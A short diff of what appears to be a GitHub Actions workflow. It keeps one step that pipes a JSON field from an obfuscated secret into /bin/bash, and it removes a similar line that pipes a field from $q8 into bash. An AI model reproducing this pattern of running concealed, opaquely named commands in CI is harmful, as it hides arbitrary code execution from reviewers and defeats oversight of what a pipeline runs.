@@ -17,7 +17,6 @@ jobs:
           enkdz4190: ${{ secrets.enkdz4190 }}
         run: |
           printf '%s' "$enkdz4190" | jq -r .fscjq678 | /bin/bash
-          echo $q8 | jq -r .lx3447 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
